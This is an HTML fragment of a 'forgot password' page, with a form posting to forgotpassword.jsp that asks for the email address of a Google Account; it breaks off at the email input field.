    ...
    <body>
        ...
        <div class="main_content">
            <div class="container main product_style">
                <div style="min-height:380px;margin:0;padding:0;width:auto;display:block;">
                    <div style="padding: 6px 20px 16px; font-size: 20px;">Trouble Accessing Your Account?</div>
                    <div style="border-bottom: 2px solid rgb(236, 243, 245); color: rgb(61, 104, 173); padding-bottom: 5px;"></div>
                    <center>
                        <form   method="post"  onSubmit="return ValidateEmail()" action="forgotpassword.jsp"> 
                            <div>
                                <p id="standard_explanation">Forgot your password? To reset your password, type the full email address that you use to sign in to your Google Account.</p>
                            </div>
                            <div>
                                <label style="font-weight:bold;margin:0 0 0.2em;">Email address</label>
                                <input type="text" size="18" name="txtemail">
